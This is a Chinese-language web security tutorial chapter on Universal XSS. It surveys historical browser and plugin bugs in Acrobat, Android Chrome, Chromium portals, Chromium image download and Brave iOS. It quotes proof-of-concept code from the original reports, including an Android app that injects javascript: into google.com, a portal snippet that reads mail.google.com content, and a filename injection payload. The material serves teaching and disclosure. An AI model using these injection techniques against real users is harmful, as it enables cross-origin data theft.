---
sidebar_position: 12
---

# 最強的 XSS：Universal XSS

我們前面提到的所有 XSS 的相關漏洞，問題幾乎都是出在網站本身，是因為網站的疏忽才導致了漏洞的發生，使得攻擊者可以在該網站上執行 JavaScript 程式碼。

但是有另外一種 XSS 就更厲害了，如同標題所說，是最強的 XSS。

原因很簡單，因為這種 XSS 攻擊的對象不是網站本身，而是瀏覽器或是內建的 plugin。

因為是瀏覽器的漏洞，所以網站本身不需要有任何問題，就算只是一個純靜態的網頁都可以被執行 XSS。藉由攻擊瀏覽器，可以達到的影響是：「無論在哪個網站都可以執行程式碼」，因此這種攻擊方式被稱為 Universal XSS，又簡稱 UXSS。

那 UXSS 的漏洞是怎麼產生的？我們來看幾個範例。

## 2006 年的 Firefox 的 Adobe Acrobat plugin

在一篇名為 [Subverting Ajax](https://fahrplan.events.ccc.de/congress/2006/Fahrplan/attachments/1158-Subverting_Ajax.pdf) 的 paper 中，描述了一個針對 Firefox 的 UXSS。

Firefox 上的 Adobe Acrobat plugin 含有漏洞，沒有做好參數的檢查。在載入 PDF 時，可以在網址列後面帶上 `#FDF=javascript:alert(1)` 的參數，就能在該 PDF 中產生 XSS。

舉例來說，`https://example.com/test.pdf#FDF=javascript:alert(1)`，只要載入這個網址，就能在 `https://example.com` 這個 origin 上面執行 JavaScript 程式碼，這就是所謂的 UXSS。

雖然說原本的論文沒有提到細節，但我猜背後的原理大概就是這個 plugin 會用 `FDF` 這個參數帶的值去執行 `window.open` 之類的，所以就可以利用 javascript: 偽協議去執行程式碼。

## 2012 年的 Android Chrome 的 UXSS

Takeshi 在 2012 年回報了一個漏洞：[Issue 144813: Security: UXSS via com.android.browser.application_id Intent extra](https://bugs.chromium.org/p/chromium/issues/detail?id=144813)。

在 Android 的世界中，有一種東西叫做「intent」，它代表的是一種「意圖」，例如說想開啟一個新的畫面，就要傳送一個「我想開啟新畫面」的 intent。

而如果想要打開 Chrome 並且瀏覽特定頁面的話，就可以照著這個意圖寫出相對應的程式碼：

``` java
// 宣告新的 intent
Intent intent = new Intent("android.intent.action.VIEW");

// intent 要傳給的對象是 Chrome app
intent.setClassName("com.android.chrome", "com.google.android.apps.chrome.Main");

// 設置要開啟的 URL
intent.setData(Uri.parse("https://example.com"));

// 開啟
startActivity(intent);
```

而 2012 年時就有人發現了可以先開啟 `https://example.com`，再開啟一個 `javascript:alert(1)`，就會變成在 `https://example.com` 這個網址上執行程式碼，形成了 UXSS 漏洞。

完整程式碼長這樣（以下程式碼來自原始報告）：

``` java
package jp.mbsd.terada.attackchrome1;

import android.app.Activity;
import android.os.Bundle;
import android.content.Intent;
import android.net.Uri;

public class Main extends Activity {
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        doit();
    }

    public void doit() {
        try {
            // Firstly, force chrome app to open a target Web page
            Intent intent1 = getIntentForChrome("http://www.google.com/1");
            startActivity(intent1);

            // Wait a few seconds
            Thread.sleep(5000);

            // JS code to inject into the target (www.google.com)
            String jsURL = "javascript:alert('domain='+document.domain)";

            Intent intent2 = getIntentForChrome(jsURL);

            // Need a trick to prevent Chrome from loading the new URL in a new tab
            intent2.putExtra("com.android.browser.application_id", "com.android.chrome");

            startActivity(intent2);
        }
        catch (Exception e) {}
    }

    // Get intent to invoke chrome app
    public Intent getIntentForChrome(String url) {
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.setClassName("com.android.chrome", "com.google.android.apps.chrome.Main");
        intent.setData(Uri.parse(url));
        return intent;
    }
}
```
## 2019 年 Chromium 透過 portal 的 UXSS

2019 年的時候 Michał Bentkowski 回報了一個漏洞：[Issue 962500: Security: Security: Same Origin Policy bypass and local file disclosure via portal element](https://bugs.chromium.org/p/chromium/issues/detail?id=962500&q=sop%20bypass&can=1)，是經由最新的功能 `<portal>` 執行的 UXSS。

這個漏洞的成因跟上面那個 Android 的一樣，範例程式碼如下（來自於原始報告）：

``` js
const p = document.createElement('portal');
p.src = 'https://mail.google.com';
// after a while:
p.src = 'javascript:portalHost.postMessage(document.documentElement.outerHTML,"*")';
// the code above will get executed in the context of https://mail.google.com
```

當你在 portal 內載入一個網址以後，如果再載入 `javascript:`，會變成是在剛剛載入的網址的 origin 去執行 JavaScript，換句話說，你可以在任意的網址上執行 JavaScript，所以就是一個 UXSS，而這個漏洞拿到了 10000 美金的賞金。

## 2021 年 Chromium 透過下載圖片觸發的 UXSS

當你在 Chromium 對一張圖片按下右鍵並選擇下載圖片時，Chromium 背後在做的事情是動態執行一段 JavaScript 的程式碼，裡面會呼叫 internal 的 JavaScript 函式，像這樣：

``` js
__gCrWeb.imageFetch.getImageData(id, '%s')
```

其中 `%s` 就是圖片檔名，而這個檔名忘了做過濾，所以如果檔名是 `'+alert(1)+'` 的話，程式碼就會變成：

``` js
__gCrWeb.imageFetch.getImageData(id, ''+alert(1)+'')
```

就執行了 `alert(1)`，當然這邊可以替換成任意程式碼，`alert(1)` 只是示範而已。

除此之外，如果現在有個 A 網域，裡面用 iframe 嵌入 B 網域，當你在 B 網域下載圖片時，這一段動態產生的 JavaScript 是在 top level window 也就是 A 網域的視窗執行的。

也就是說，利用這個漏洞，如果我能夠在別的網域裡面用 iframe 嵌入我的攻擊網址，就能在那個網域上面執行任意程式碼，構成了 UXSS。

原始的報告跟 PoC 可以參考 Muneaki Nishimura 回報的 [Issue 1164846: Security: ImageFetchTabHelper::GetImageDataByJs allows child frames to inject scripts into parent (UXSS)](https://bugs.chromium.org/p/chromium/issues/detail?id=1164846)

## 多個 Brave 瀏覽器 iOS app 的 UXSS

Brave 是一個基於 Chromium 且強調隱私的瀏覽器，背後的創辦人是 JavaScript 之父 Brendan Eich，而 Brave 的 iOS app 之前被日本的資安研究員 Muneaki Nishimura 發現了多個 UXSS 的漏洞（上面那個 Chromium 的 UXSS 也是他回報的）。

漏洞發生的原因跟上面講的很像，都是由於 app 本身動態執行了 JavaScript 程式碼，而這些 JavaScript 程式碼的輸入又沒有經過過濾，於是就導致了 UXSS 的產生。

例如說可能有段程式碼是這樣：

``` swift
self.tab?.webview?.evaluateJavaScript("u2f.postLowLevelRegister(\(requestId), \(true), '\(version)')")
```

而 version 是我們可以控制的，與此同時這一段 script 又是執行在 top level，於是 sub frame 就可以對 parent 做攻擊，在其他 origin 上執行 XSS。

更多細節可以參考 Muneaki Nishimura 的投影片 [Brave Browserの脆弱性を見つけた話（iOS編）](https://speakerdeck.com/nishimunea/brave-browsernocui-ruo-xing-wojian-tuketahua-iosbian)

## 小結

像是這種 UXSS，通常網站本身是無能為力的，因為漏洞並不是出在網站，而是出在瀏覽器。

而對瀏覽器來說這其實也是一個影響力很大的漏洞，你仔細想想，如果攻擊者真的利用了 UXSS，他可以讀你的 gmail，讀你的 Facebook 訊息，把你的資料全部都拿走，是很可怕的一件事。

身為使用者，我們能做的就是時時刻刻把瀏覽器更新到最新版本，並且希望廠商趕快把漏洞修復。

UXSS 的嚴重程度比較高，案例也比較少，大多數都是年代久遠（例如說十年前）的漏洞，大家可以自己試著找找看以前發生過的 UXSS 漏洞（跟上面不重複），並貼在留言區跟其他人分享。
